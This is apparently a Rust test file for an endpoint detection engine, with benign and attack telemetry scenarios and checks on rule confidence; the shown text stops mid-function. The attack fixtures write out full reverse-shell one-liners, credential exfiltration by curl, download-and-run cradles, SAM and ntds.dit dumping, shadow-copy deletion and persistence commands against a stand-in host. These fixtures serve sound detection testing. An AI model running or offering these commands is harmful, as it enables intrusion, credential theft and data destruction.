// Adapted RULEAUDIT2-A1 synthetic scenarios: precision and attack controls.
// Seeds and remaining built-in YAML are read from the real bootstrap source;
// default temporal/L4 families are shared with production. Directory packs are
// intentionally excluded (APACKS owns their qualification).

use std::collections::BTreeMap;

use detection::{
    confidence_policy, Confidence, DetectionEngine, DetectionSignals, EventClass, TelemetryEvent,
};

const BOOTSTRAP: &str = include_str!("../../agent-core/src/lifecycle/detection_bootstrap.rs");

fn literals_between(start: &str, end: &str) -> Vec<String> {
    let body = BOOTSTRAP
        .split_once(start)
        .unwrap()
        .1
        .split_once(end)
        .unwrap()
        .0;
    let mut out = Vec::new();
    for line in body.lines() {
        let line = line.trim();
        if line.starts_with("//") {
            continue;
        }
        if let Some(rest) = line.strip_prefix('"') {
            if let Some((lit, _)) = rest.split_once("\".to_string()") {
                out.push(lit.replace("\\\\", "\\"));
            }
        }
    }
    out
}

fn sigma_sources() -> Vec<&'static str> {
    BOOTSTRAP
        .split("const SIGMA_")
        .skip(1)
        .map(|part| {
            part.split_once("r#\"")
                .unwrap()
                .1
                .split_once("\"#;")
                .unwrap()
                .0
        })
        .collect()
}

fn production_like_engine() -> DetectionEngine {
    let mut d = DetectionEngine::default_with_rules();
    d.layer1.load_hashes(literals_between(
        "fn seed_ioc_hashes",
        "fn seed_string_signatures",
    ));
    let sigs = literals_between("load_string_signatures([", "]);");
    let feats = literals_between("load_string_features([", "]);");
    d.layer1.load_string_signatures(sigs);
    d.layer1.load_string_features(feats);
    for source in sigma_sources() {
        d.load_sigma_rule_yaml(source).expect("built-in compiles");
    }
    d
}

#[derive(Clone)]
struct E(TelemetryEvent);

#[allow(clippy::too_many_arguments)]
fn ev(
    ts: i64,
    class: EventClass,
    pid: u32,
    ppid: u32,
    uid: u32,
    process: &str,
    parent: &str,
    session: u32,
) -> E {
    E(TelemetryEvent {
        ts_unix: ts,
        event_class: class,
        pid,
        ppid,
        uid,
        process: process.into(),
        parent_process: parent.into(),
        session_id: session,
        file_path: None,
        file_write: false,
        file_hash: None,
        dst_port: None,
        dst_ip: None,
        dst_domain: None,
        command_line: None,
        event_size: None,
        container_runtime: None,
        container_id: None,
        container_escape: false,
        container_privileged: false,
    })
}

impl E {
    fn cmd(mut self, c: &str) -> Self {
        self.0.command_line = Some(c.into());
        self
    }
    fn file(mut self, p: &str, write: bool) -> Self {
        self.0.file_path = Some(p.into());
        self.0.file_write = write;
        self
    }
    fn net(mut self, ip: &str, port: u16) -> Self {
        self.0.dst_ip = Some(ip.into());
        self.0.dst_port = Some(port);
        self
    }
    fn dom(mut self, d: &str) -> Self {
        self.0.dst_domain = Some(d.into());
        self
    }
    fn hash(mut self, h: &str) -> Self {
        self.0.file_hash = Some(h.into());
        self
    }
}

use EventClass::*;

// Deliberately retain the old shared PID-1 key in fixtures: it must never
// authorize correlations without causal PID/PPID evidence.
const HOST_SESSION: u32 = 1;
// Windows: chain root is typically explorer/wininit; use one desktop root.
const WIN_SESSION: u32 = 5000;

struct Outcome {
    max: Confidence,
    temporal: BTreeMap<String, usize>,
    kill_chain: Vec<String>,
    named: Vec<String>,
    prefilter: bool,
    other: Vec<String>,
}

fn run(events: &[E]) -> Outcome {
    let mut d = production_like_engine();
    let mut o = Outcome {
        max: Confidence::None,
        temporal: BTreeMap::new(),
        kill_chain: Vec::new(),
        named: Vec::new(),
        prefilter: false,
        other: Vec::new(),
    };
    for e in events {
        let r = d.process_event(&e.0);
        if r.confidence > o.max {
            o.max = r.confidence;
        }
        for h in r.temporal_hits {
            *o.temporal.entry(h).or_default() += 1;
        }
        o.kill_chain.extend(r.kill_chain_hits);
        o.named.extend(r.layer1.matched_signatures);
        o.prefilter |= r.layer1.prefilter_hit;
        o.other
            .extend(r.exploit_indicators.iter().map(|s| format!("exploit:{s}")));
        o.other
            .extend(r.tamper_indicators.iter().map(|s| format!("tamper:{s}")));
        o.other.extend(
            r.kernel_integrity_indicators
                .iter()
                .map(|s| format!("kernel:{s}")),
        );
        if r.signals.z1_exact_ioc {
            o.other.push("z1_exact_ioc".into());
        }
        if r.signals.z3_anomaly_high || r.signals.z3_anomaly_med {
            o.other.push("z3".into());
        }
    }
    o.kill_chain.sort();
    o.kill_chain.dedup();
    o.named.sort();
    o.named.dedup();
    o.other.sort();
    o.other.dedup();
    o
}

fn sev(c: Confidence) -> &'static str {
    match c {
        Confidence::Definite => "critical",
        Confidence::VeryHigh | Confidence::High => "high",
        Confidence::Medium => "medium",
        Confidence::Low => "low",
        Confidence::None => "info",
    }
}

fn scenarios() -> Vec<(&'static str, &'static str, &'static str, Vec<E>)> {
    let s = HOST_SESSION;
    let w = WIN_SESSION;
    vec![
        // ───────────── Linux benign ─────────────
        ("LB01", "benign", "cron health check curl, unrelated cron backup.sh 4s later", vec![
            ev(100, ProcessExec, 1001, 900, 0, "curl", "sh", s).cmd("curl -fsS http://127.0.0.1:8080/health"),
            ev(104, ProcessExec, 1002, 901, 0, "bash", "cron", s).cmd("/bin/bash /usr/local/bin/backup.sh"),
        ]),
        ("LB02", "benign", "admin sudo -i", vec![
            ev(100, ProcessExec, 2001, 2000, 1000, "sudo", "bash", s).cmd("sudo -i"),
            ev(101, ProcessExec, 2002, 2001, 0, "bash", "sudo", s).cmd("-bash"),
        ]),
        ("LB03", "benign", "sudo python3 manage.py migrate", vec![
            ev(100, ProcessExec, 2101, 2000, 1000, "sudo", "bash", s).cmd("sudo python3 manage.py migrate"),
            ev(101, ProcessExec, 2102, 2101, 0, "python3", "sudo", s).cmd("python3 manage.py migrate"),
        ]),
        ("LB04", "benign", "ssh deploy@host with key auth", vec![
            ev(100, ProcessExec, 3001, 3000, 1000, "ssh", "bash", s).cmd("ssh deploy@10.0.0.5"),
            ev(100, FileOpen, 3001, 3000, 1000, "ssh", "bash", s).file("/home/u/.ssh/id_ed25519", false),
            ev(101, NetworkConnect, 3001, 3000, 1000, "ssh", "bash", s).net("10.0.0.5", 22),
        ]),
        ("LB05", "benign", "git pull over ssh (git spawns ssh)", vec![
            ev(100, ProcessExec, 3101, 3100, 1000, "ssh", "git", s).cmd("/usr/bin/ssh git@github.com git-upload-pack 'org/repo.git'"),
            ev(100, FileOpen, 3101, 3100, 1000, "ssh", "git", s).file("/home/u/.ssh/id_ed25519", false),
            ev(101, NetworkConnect, 3101, 3100, 1000, "ssh", "git", s).net("140.82.112.3", 22),
        ]),
        ("LB06", "benign", "kubectl get pods", vec![
            ev(100, ProcessExec, 3201, 3000, 1000, "kubectl", "bash", s).cmd("kubectl get pods -A"),
            ev(100, FileOpen, 3201, 3000, 1000, "kubectl", "bash", s).file("/home/u/.kube/config", false),
            ev(101, NetworkConnect, 3201, 3000, 1000, "kubectl", "bash", s).net("10.0.0.10", 6443),
        ]),
        ("LB07", "benign", "aws s3 ls", vec![
            ev(100, ProcessExec, 3301, 3000, 1000, "aws", "bash", s).cmd("/usr/bin/python3 /usr/local/bin/aws s3 ls"),
            ev(100, FileOpen, 3301, 3000, 1000, "aws", "bash", s).file("/home/u/.aws/credentials", false),
            ev(101, NetworkConnect, 3301, 3000, 1000, "aws", "bash", s).net("52.216.0.1", 443),
        ]),
        ("LB08", "benign", "modprobe loads nf_conntrack (docker start)", vec![
            ev(100, ModuleLoad, 3401, 1, 0, "modprobe", "dockerd", s).file("/lib/modules/6.1.0-26-amd64/kernel/net/netfilter/nf_conntrack.ko", false),
        ]),
        ("LB09", "benign", "systemctl enable --now nginx (wants symlink write)", vec![
            ev(100, ProcessExec, 4001, 3000, 0, "systemctl", "bash", s).cmd("systemctl enable --now nginx"),
            ev(101, FileOpen, 4001, 3000, 0, "systemctl", "bash", s).cmd("systemctl enable --now nginx").file("/etc/systemd/system/multi-user.target.wants/nginx.service", true),
        ]),
        ("LB10", "benign", "user cats own public key", vec![
            ev(100, ProcessExec, 4101, 3000, 1000, "cat", "bash", s).cmd("cat /home/u/.ssh/id_ed25519.pub"),
            ev(100, FileOpen, 4101, 3000, 1000, "cat", "bash", s).cmd("cat /home/u/.ssh/id_ed25519.pub").file("/home/u/.ssh/id_ed25519.pub", false),
        ]),
        ("LB11", "benign", "sh -c curl release | sha256sum (checksum)", vec![
            ev(100, ProcessExec, 4201, 3000, 1000, "sh", "make", s).cmd("sh -c curl -fsSL https://github.com/x/y/releases/download/v1/y.tar.gz | sha256sum"),
        ]),
        ("LB12", "benign", "port check echo > /dev/tcp (no &)", vec![
            ev(100, ProcessExec, 4301, 3000, 0, "bash", "timeout", s).cmd("bash -c echo > /dev/tcp/127.0.0.1/5432"),
            ev(100, NetworkConnect, 4301, 3000, 0, "bash", "timeout", s).cmd("bash -c echo > /dev/tcp/127.0.0.1/5432").net("127.0.0.1", 5432),
        ]),
        ("LB13", "benign", "journal cleanup rm -rf /var/log/journal/*", vec![
            ev(100, ProcessExec, 4401, 3000, 0, "rm", "bash", s).cmd("rm -rf /var/log/journal/3f2a/system@0001.journal~"),
        ]),
        ("LB14", "benign", "VS Code server login-shell env probe bash -ilc", vec![
            ev(100, ProcessExec, 4501, 4500, 1000, "bash", "node", s).cmd("/bin/bash -ilc echo -n 6b0e && /usr/bin/env -0"),
        ]),
        ("LB15", "benign", "apache2 CGI perl (nagios/cgit) connects MySQL", vec![
            ev(100, ProcessExec, 4601, 4600, 33, "perl", "apache2", s).cmd("/usr/bin/perl /usr/lib/cgi-bin/status.cgi"),
            ev(101, NetworkConnect, 4601, 4600, 33, "perl", "apache2", s).net("127.0.0.1", 3306),
        ]),
        ("LB16", "benign", "sudo bash -c 'systemctl enable --now nginx'", vec![
            ev(100, ProcessExec, 4701, 3000, 1000, "sudo", "bash", s).cmd("sudo bash -c systemctl enable --now nginx"),
            ev(101, ProcessExec, 4702, 4701, 0, "bash", "sudo", s).cmd("bash -c systemctl enable --now nginx"),
        ]),
        ("LB17", "benign", "cron curl health then unrelated python3 -c on host", vec![
            ev(100, ProcessExec, 4801, 900, 0, "curl", "sh", s).cmd("curl -fsS http://127.0.0.1:9100/metrics"),
            ev(103, ProcessExec, 4802, 902, 0, "python3", "cron", s).cmd("python3 -c import certbot.main; certbot.main.main(['renew','-q'])"),
        ]),
        ("LB18", "benign", "user greps own ~/.aws/credentials (profile check)", vec![
            ev(100, FileOpen, 4901, 3000, 1000, "grep", "bash", s).cmd("grep profile /home/u/.aws/credentials").file("/home/u/.aws/credentials", false),
        ]),
        ("LB19", "benign", "unrelated root daemon connect after kubectl read (same pid only)", vec![
            ev(100, FileOpen, 5001, 3000, 1000, "kubectl", "bash", s).file("/home/u/.kube/config", false),
            ev(101, NetworkConnect, 5002, 1, 0, "chronyd", "systemd", s).net("162.159.200.1", 123),
        ]),
        // ───────────── Linux attacks ─────────────
        ("LA01", "attack", "curl -o /tmp/x then chmod +x", vec![
            ev(100, ProcessExec, 6001, 6000, 1000, "curl", "bash", s).cmd("curl -s -o /tmp/.x http://203.0.113.50/x"),
            ev(102, ProcessExec, 6002, 6000, 1000, "chmod", "bash", s).cmd("chmod +x /tmp/.x"),
        ]),
        ("LA02", "attack", "bash -c 'bash -i >& /dev/tcp' realistic fork model (child connects)", vec![
            ev(100, ProcessExec, 6101, 6100, 1000, "bash", "bash", s).cmd("bash -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"),
            ev(100, NetworkConnect, 6102, 6101, 1000, "bash", "bash", s).cmd("bash -c bash -i >& /dev/tcp/203.0.113.50/4444 0>&1").net("203.0.113.50", 4444),
            ev(100, ProcessExec, 6102, 6101, 1000, "bash", "bash", s).cmd("bash -i"),
        ]),
        ("LA02b", "attack", "same reverse shell, test-model (exec+connect same pid)", vec![
            ev(100, ProcessExec, 6201, 6100, 1000, "bash", "bash", s).cmd("bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"),
            ev(100, NetworkConnect, 6201, 6100, 1000, "bash", "bash", s).cmd("bash -i >& /dev/tcp/203.0.113.50/4444 0>&1").net("203.0.113.50", 4444),
        ]),
        ("LA03", "attack", "no-space variant >&/dev/tcp same pid", vec![
            ev(100, ProcessExec, 6301, 6100, 1000, "bash", "bash", s).cmd("bash -i >&/dev/tcp/203.0.113.50/4444 0>&1"),
            ev(100, NetworkConnect, 6301, 6100, 1000, "bash", "bash", s).cmd("bash -i >&/dev/tcp/203.0.113.50/4444 0>&1").net("203.0.113.50", 4444),
        ]),
        ("LA04", "attack", "mkfifo | sh -i | nc reverse shell", vec![
            ev(100, ProcessExec, 6401, 6100, 1000, "sh", "bash", s).cmd("sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 203.0.113.50 4444 >/tmp/f"),
            ev(100, ProcessExec, 6402, 6401, 1000, "sh", "sh", s).cmd("sh -i"),
            ev(100, ProcessExec, 6403, 6401, 1000, "nc", "sh", s).cmd("nc 203.0.113.50 4444"),
            ev(100, NetworkConnect, 6403, 6401, 1000, "nc", "sh", s).cmd("nc 203.0.113.50 4444").net("203.0.113.50", 4444),
        ]),
        ("LA05", "attack", "ncat host port -e /bin/bash", vec![
            ev(100, ProcessExec, 6501, 6100, 1000, "ncat", "bash", s).cmd("ncat 203.0.113.50 4444 -e /bin/bash"),
            ev(100, NetworkConnect, 6501, 6100, 1000, "ncat", "bash", s).cmd("ncat 203.0.113.50 4444 -e /bin/bash").net("203.0.113.50", 4444),
        ]),
        ("LA06", "attack", "python socket/dup2 reverse shell", vec![
            ev(100, ProcessExec, 6601, 6100, 1000, "python3", "bash", s).cmd("python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"203.0.113.50\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call([\"/bin/sh\",\"-i\"])"),
            ev(100, NetworkConnect, 6601, 6100, 1000, "python3", "bash", s).net("203.0.113.50", 4444),
        ]),
        ("LA07", "attack", "xmrig to stratum pool", vec![
            ev(100, ProcessExec, 6701, 6100, 1000, "xmrig", "bash", s).cmd("./xmrig -o stratum+tcp://pool.example.org:4444 -u 4AbC -k"),
            ev(101, NetworkConnect, 6701, 6100, 1000, "xmrig", "bash", s).net("198.18.0.9", 4444),
        ]),
        ("LA08", "attack", "sudo cat /etc/shadow (cat runs uid 0)", vec![
            ev(100, ProcessExec, 6801, 6800, 0, "cat", "sudo", s).cmd("cat /etc/shadow"),
            ev(100, FileOpen, 6801, 6800, 0, "cat", "sudo", s).cmd("cat /etc/shadow").file("/etc/shadow", false),
        ]),
        ("LA09", "attack", "curl uploads ~/.aws/credentials to attacker", vec![
            ev(100, ProcessExec, 6901, 6100, 1000, "curl", "bash", s).cmd("curl -s -F f=@/home/u/.aws/credentials https://203.0.113.50/u"),
            ev(100, FileOpen, 6901, 6100, 1000, "curl", "bash", s).file("/home/u/.aws/credentials", false),
            ev(101, NetworkConnect, 6901, 6100, 1000, "curl", "bash", s).net("203.0.113.50", 443),
        ]),
        ("LA10", "attack", "root shell writes /etc/cron.d via redirection", vec![
            ev(100, ProcessExec, 7001, 6100, 0, "bash", "bash", s).cmd("bash -c echo '* * * * * root /tmp/.x' > /etc/cron.d/0hourly2"),
            ev(100, FileOpen, 7001, 6100, 0, "bash", "bash", s).cmd("bash -c echo '* * * * * root /tmp/.x' > /etc/cron.d/0hourly2").file("/etc/cron.d/0hourly2", true),
        ]),
        ("LA11", "attack", "root writes /etc/systemd/system/evil.service with tee then enables", vec![
            ev(100, ProcessExec, 7101, 6100, 0, "tee", "bash", s).cmd("tee /etc/systemd/system/dbus-org.update.service"),
            ev(100, FileOpen, 7101, 6100, 0, "tee", "bash", s).file("/etc/systemd/system/dbus-org.update.service", true),
            ev(101, ProcessExec, 7102, 6100, 0, "systemctl", "bash", s).cmd("systemctl enable dbus-org.update.service"),
            ev(101, FileOpen, 7102, 6100, 0, "systemctl", "bash", s).cmd("systemctl enable dbus-org.update.service").file("/etc/systemd/system/multi-user.target.wants/dbus-org.update.service", true),
        ]),
        ("LA12", "attack", "insmod rootkit from /tmp", vec![
            ev(100, ModuleLoad, 7201, 6100, 0, "insmod", "bash", s).cmd("insmod /tmp/.d/diamorphine.ko").file("/tmp/.d/diamorphine.ko", false),
        ]),
        ("LA13", "attack", "wget -qO- url | bash (one-liner, sh -c cmdline)", vec![
            ev(100, ProcessExec, 7301, 6100, 1000, "sh", "bash", s).cmd("sh -c wget -qO- http://203.0.113.50/i.sh | bash"),
            ev(100, ProcessExec, 7302, 7301, 1000, "wget", "sh", s).cmd("wget -qO- http://203.0.113.50/i.sh"),
            ev(100, ProcessExec, 7303, 7301, 1000, "bash", "sh", s).cmd("bash"),
        ]),
        // ───────────── IOC seeds ─────────────
        ("IB01", "benign", "lab device on TEST-NET 192.0.2.1 (doc range misused internally)", vec![
            ev(100, NetworkConnect, 8001, 1, 0, "svchost.exe", "services.exe", w).net("192.0.2.1", 443),
        ]),
        ("IA01", "attack", "connect to seeded known-c2.example.com", vec![
            ev(100, NetworkConnect, 8101, 1, 1000, "curl", "bash", s).dom("known-c2.example.com").net("93.184.216.34", 443),
        ]),
        ("IA02", "attack", "EICAR file (sha256 seed)", vec![
            ev(100, FileOpen, 8201, 1, 1000, "cp", "bash", s).file("/tmp/eicar.com", true).hash("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"),
        ]),
        // ───────────── Windows benign (uid always 0) ─────────────
        ("WB01", "benign", "installer schtasks /Create GoogleUpdateTaskMachineUA", vec![
            ev(100, ProcessExec, 9001, 9000, 0, "schtasks.exe", "GoogleUpdate.exe", w).cmd("\"C:\\Windows\\system32\\schtasks.exe\" /Create /TN GoogleUpdateTaskMachineUA /TR \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /ua\" /SC DAILY /F"),
        ]),
        ("WB02", "benign", "vendor agent powershell iex local script", vec![
            ev(100, ProcessExec, 9101, 9100, 0, "powershell.exe", "VendorSvc.exe", w).cmd("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"iex (Get-Content 'C:\\ProgramData\\Vendor\\inventory.ps1' -Raw)\""),
        ]),
        ("WB03", "benign", "installer sc.exe create service", vec![
            ev(100, ProcessExec, 9201, 9200, 0, "sc.exe", "msiexec.exe", w).cmd("sc.exe create VendorAgent binPath= \"C:\\Program Files\\Vendor\\agent.exe --service\" start= auto"),
        ]),
        ("WB04", "benign", "upgrade sc config binpath=", vec![
            ev(100, ProcessExec, 9301, 9300, 0, "sc.exe", "cmd.exe", w).cmd("sc config VendorAgent binpath= \"C:\\Program Files\\Vendor\\v2\\agent.exe\""),
        ]),
        ("WB05", "benign", "schtasks /Query (control)", vec![
            ev(100, ProcessExec, 9401, 9400, 0, "schtasks.exe", "cmd.exe", w).cmd("schtasks /Query /FO LIST /V"),
        ]),
        ("WB06", "benign", "file_open by cradle powershell (amplification control)", vec![
            ev(100, FileOpen, 9501, 9500, 0, "powershell.exe", "explorer.exe", w).cmd("powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://x/a.ps1')").file("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\en-US\\x.psd1", false),
        ]),
        ("WB07", "benign", "chocolatey bootstrap (sanctioned cradle; dual-use)", vec![
            ev(100, ProcessExec, 9601, 9600, 0, "powershell.exe", "explorer.exe", w).cmd("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\""),
        ]),
        // ───────────── Windows attacks ─────────────
        ("WA01", "attack", "reg save HKLM\\SAM", vec![
            ev(100, ProcessExec, 9701, 9700, 0, "reg.exe", "cmd.exe", w).cmd("reg save HKLM\\SAM C:\\Users\\Public\\sam.save"),
        ]),
        ("WA02", "attack", "reg save \"HKLM\\SAM\" (quoted)", vec![
            ev(100, ProcessExec, 9702, 9700, 0, "reg.exe", "cmd.exe", w).cmd("reg.exe save \"HKLM\\SAM\" C:\\Users\\Public\\s.hiv /y"),
        ]),
        ("WA03", "attack", "vssadmin.exe Delete Shadows /All /Quiet", vec![
            ev(100, ProcessExec, 9801, 9800, 0, "vssadmin.exe", "cmd.exe", w).cmd("vssadmin.exe Delete Shadows /All /Quiet"),
        ]),
        ("WA04", "attack", "cmd /c vssadmin delete shadows", vec![
            ev(100, ProcessExec, 9802, 9800, 0, "cmd.exe", "evil.exe", w).cmd("cmd.exe /c vssadmin delete shadows /all /quiet"),
            ev(100, ProcessExec, 9803, 9802, 0, "vssadmin.exe", "cmd.exe", w).cmd("vssadmin delete shadows /all /quiet"),
        ]),
        ("WA05", "attack", "IEX (New-Object Net.WebClient).DownloadString", vec![
            ev(100, ProcessExec, 9901, 9900, 0, "powershell.exe", "winword.exe", w).cmd("powershell.exe -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')\""),
        ]),
        ("WA06", "attack", "iwr url | iex", vec![
            ev(100, ProcessExec, 9902, 9900, 0, "powershell.exe", "winword.exe", w).cmd("powershell.exe -c \"iwr http://203.0.113.50/a.ps1 -UseBasicParsing | iex\""),
        ]),
        ("WA07", "attack", "irm url | iex (pwsh)", vec![
            ev(100, ProcessExec, 9903, 9900, 0, "pwsh.exe", "cmd.exe", w).cmd("pwsh.exe -c irm https://203.0.113.50/a.ps1|iex"),
        ]),
        ("WA08", "attack", "powershell -enc <cradle>", vec![
            ev(100, ProcessExec, 9904, 9900, 0, "powershell.exe", "wmiprvse.exe", w).cmd("powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"),
        ]),
        ("WA09", "attack", "wevtutil.exe cl Security", vec![
            ev(100, ProcessExec, 9905, 9900, 0, "wevtutil.exe", "cmd.exe", w).cmd("wevtutil.exe cl Security"),
        ]),
        ("WA10", "attack", "schtasks /create onlogon SYSTEM payload", vec![
            ev(100, ProcessExec, 9906, 9900, 0, "schtasks.exe", "cmd.exe", w).cmd("schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc onlogon /ru SYSTEM /f"),
        ]),
        ("WA11", "attack", "sc.exe create evil binPath= cmd /c", vec![
            ev(100, ProcessExec, 9907, 9900, 0, "sc.exe", "cmd.exe", w).cmd("sc.exe create evilsvc binPath= \"cmd /c C:\\Users\\Public\\p.exe\""),
        ]),
        ("WA12", "attack", "copy ntds.dit from shadow by cmd.exe (Windows uid 0)", vec![
            ev(100, FileOpen, 9908, 9900, 0, "cmd.exe", "evil.exe", w).cmd("cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Users\\Public\\n.dit").file("C:\\Windows\\NTDS\\ntds.dit", false),
        ]),
        ("WA13", "attack", "powershell reads KeePass db (Windows uid 0)", vec![
            ev(100, FileOpen, 9909, 9900, 0, "powershell.exe", "evil.exe", w).file("C:\\Users\\u\\Documents\\KeePass\\Database.kdbx", false),
        ]),
    ]
}

#[test]
fn ra2_a1_scenario_table() {
    let mut lines = Vec::new();
    let mut by_id = BTreeMap::new();
    for (id, kind, desc, events) in scenarios()
        .into_iter()
        .filter(|(id, _, _, _)| !id.starts_with("W"))
    {
        let o = run(&events);
        let temporal: Vec<String> = o
            .temporal
            .iter()
            .map(|(k, v)| {
                if *v > 1 {
                    format!("{k}x{v}")
                } else {
                    k.clone()
                }
            })
            .collect();
        let line = format!(
            "{id}\t{kind}\t{:?}\t{}\ttemporal=[{}]\tkillchain=[{}]\tl1_named=[{}]\tprefilter={}\tother=[{}]\t{desc}",
            o.max,
            sev(o.max),
            temporal.join(","),
            o.kill_chain.join(","),
            o.named.join(","),
            o.prefilter,
            o.other.join(","),
        );
        lines.push(line);
        by_id.insert(id, o);
    }
    println!("RA2-A1-TABLE-BEGIN");
    for l in &lines {
        println!("{l}");
    }
    println!("RA2-A1-TABLE-END");

    let bad: Vec<_> = scenarios()
        .into_iter()
        .filter_map(|(id, kind, _, _)| {
            (kind == "benign" && !id.starts_with("W") && by_id[id].max >= Confidence::High)
                .then_some(id)
        })
        .collect();
    assert!(bad.is_empty(), "benign HIGH cases: {bad:?}");
    for (id, minimum, expected_rule) in [
        ("LA02", Confidence::High, "phi_reverse_shell"),
        ("LA02b", Confidence::High, "phi_reverse_shell"),
        ("LA03", Confidence::High, "phi_reverse_shell"),
        ("LA04", Confidence::High, "phi_reverse_shell"),
        ("LA05", Confidence::High, "phi_reverse_shell"),
        ("LA06", Confidence::High, "phi_reverse_shell"),
        ("LA08", Confidence::High, "eguard_builtin_shadow_read"),
        ("LA09", Confidence::High, "phi_credential_exfil"),
        ("LA10", Confidence::Medium, "phi_persistence_write"),
        ("LA11", Confidence::High, "phi_persistence_install"),
        ("LA12", Confidence::High, "eguard_builtin_kernel_module"),
        ("LA13", Confidence::Medium, "phi_download_pipe_shell"),
    ] {
        assert!(by_id[id].max >= minimum, "{id}: attack below {minimum:?}");
        assert!(
            by_id[id].temporal.contains_key(expected_rule),
            "{id}: missing {expected_rule}"
        );
    }
    assert!(by_id["LA07"].max >= Confidence::High);
    assert_eq!(by_id["IA02"].max, Confidence::Definite);
    assert_eq!(
        by_id["IA01"].max,
        Confidence::None,
        "a deleted placeholder is not an attack"
    );
}

#[test]
fn ra2_a1_policy_matrix() {
    let base = DetectionSignals::default();
    let mut rows = Vec::new();
    let mut check = |name: &str, s: DetectionSignals| {
        let c = confidence_policy(&s);
        rows.push(format!("{name}\t{c:?}"));
        c
    };
    let mut s = base.clone();
    s.l1_prefilter_hit = true;
    assert_eq!(
        check("l1_prefilter_only(named or feature)", s),
        Confidence::None
    );
    let mut s = base.clone();
    s.z2_temporal = true;
    assert_eq!(check("z2_temporal_only", s), Confidence::High);
    let mut s = base.clone();
    s.z2_temporal = true;
    s.l1_prefilter_hit = true;
    assert_eq!(
        check("z2_temporal+l1_prefilter(feature)", s),
        Confidence::High
    );
    let mut s = base.clone();
    s.network_ioc_hit = true;
    assert_eq!(
        check("network_ioc_hit(prefilter only)", s),
        Confidence::High
    );
    let mut s = base.clone();
    s.z1_exact_ioc = true;
    assert_eq!(check("z1_exact_ioc", s), Confidence::Definite);
    let mut s = base.clone();
    s.kernel_integrity = true;
    assert_eq!(check("kernel_integrity", s), Confidence::Medium);
    let mut s = base.clone();
    s.z3_anomaly_high = true;
    s.l1_prefilter_hit = true;
    assert_eq!(check("z3_high+l1_prefilter", s), Confidence::Medium);
    let mut s = base;
    s.tamper_indicator = true;
    s.vulnerable_software = true;
    assert_eq!(check("tamper+vulnerable_software", s), Confidence::VeryHigh);
    println!("RA2-A1-POLICY-BEGIN");
    for r in rows {
        println!("{r}");
    }
    println!("RA2-A1-POLICY-END");
}

#[test]
fn ra2_a1_l1_substring_collisions() {
    let d = production_like_engine();
    let cases = [
        "sh -c curl -fsSL https://x/y.tar.gz | sha256sum",
        "sh -c curl -s https://x/list.txt | shuf -n1",
        "sh -c curl -fsSL https://get.docker.com | sh",
        "sh -c wget -qO- https://x/i.sh | bash",
        "curl|bash",
        "/bin/bash -il",
        "rm -rf /var/log/nginx/old",
        "grep -r minerd /etc",
        "reminderd --daemon",
    ];
    println!("RA2-A1-L1-BEGIN");
    for c in cases {
        let e = ev(1, ProcessExec, 1, 1, 0, "sh", "bash", 1).cmd(c);
        let h = d.layer1.check_event(&e.0);
        println!(
            "{c}\tprefilter={}\tnamed={:?}",
            h.prefilter_hit, h.matched_signatures
        );
    }
    println!("RA2-A1-L1-END");
    // Real one-liners never contain the adjacent "curl|sh" seed strings.
    let docker = d.layer1.check_event(
        &ev(1, ProcessExec, 1, 1, 0, "sh", "bash", 1)
            .cmd("sh -c wget -qO- https://x/i.sh | bash")
            .0,
    );
    assert!(!docker
        .matched_signatures
        .iter()
        .any(|s| s.contains("wget|bash") || s.contains("wget | bash")));
}

#[test]
fn ra2_a1_bundle_jsonl_ioc_lines_are_inert() {
    // build-bundle.yml: "domains/IPs are JSONL after merge"; layer1 parse_ioc_line
    // keeps the whole line, so the indicator can never match.
    let mut l1 = detection::IocLayer1::new();
    let jsonl =
        "{\"value\":\"evil-c2.test\",\"confidence\":\"medium\",\"sources\":[\"urlhaus\"]}\n\
                 {\"value\":\"203.0.113.77\",\"confidence\":\"medium\",\"sources\":[\"feodo\"]}\n";
    let n = l1.load_domains_from_reader(std::io::Cursor::new(jsonl.as_bytes()));
    let m = l1.load_ips_from_reader(std::io::Cursor::new(jsonl.as_bytes()));
    println!(
        "RA2-A1-JSONL loaded_domains={n} loaded_ips={m} domain={:?} ip={:?}",
        l1.check_domain("evil-c2.test"),
        l1.check_ip("203.0.113.77")
    );
    assert_eq!(
        n, 2,
        "lines are counted as loaded (manifest count check passes)"
    );
    assert_eq!(
        l1.check_domain("evil-c2.test"),
        detection::Layer1Result::Clean
    );
    assert_eq!(l1.check_ip("203.0.113.77"), detection::Layer1Result::Clean);
    // Plain-line format works, including parent-suffix semantics.
    let mut plain = detection::IocLayer1::new();
    plain.load_domains_from_reader(std::io::Cursor::new(b"drive.google.com\n".as_slice()));
    let sub = plain.check_domain("doc-0s-8c-docs.drive.google.com");
    println!("RA2-A1-SUFFIX drive.google.com covers subdomain: {sub:?}");
    assert_eq!(sub, detection::Layer1Result::ExactMatch);
}

#[test]
#[ignore = "RAFIX-INTEGRATION: needs APACKS sigma compiler"]
fn rafix_windows_scenarios() {
    let mut bad = Vec::new();
    for (id, kind, _, events) in scenarios()
        .into_iter()
        .filter(|(id, _, _, _)| id.starts_with("W"))
    {
        let o = run(&events);
        println!("RAFIX-WINDOWS {id} {:?} {:?}", o.max, o.temporal);
        let minimum = if matches!(id, "WA07" | "WA08") {
            Confidence::Medium
        } else {
            Confidence::High
        };
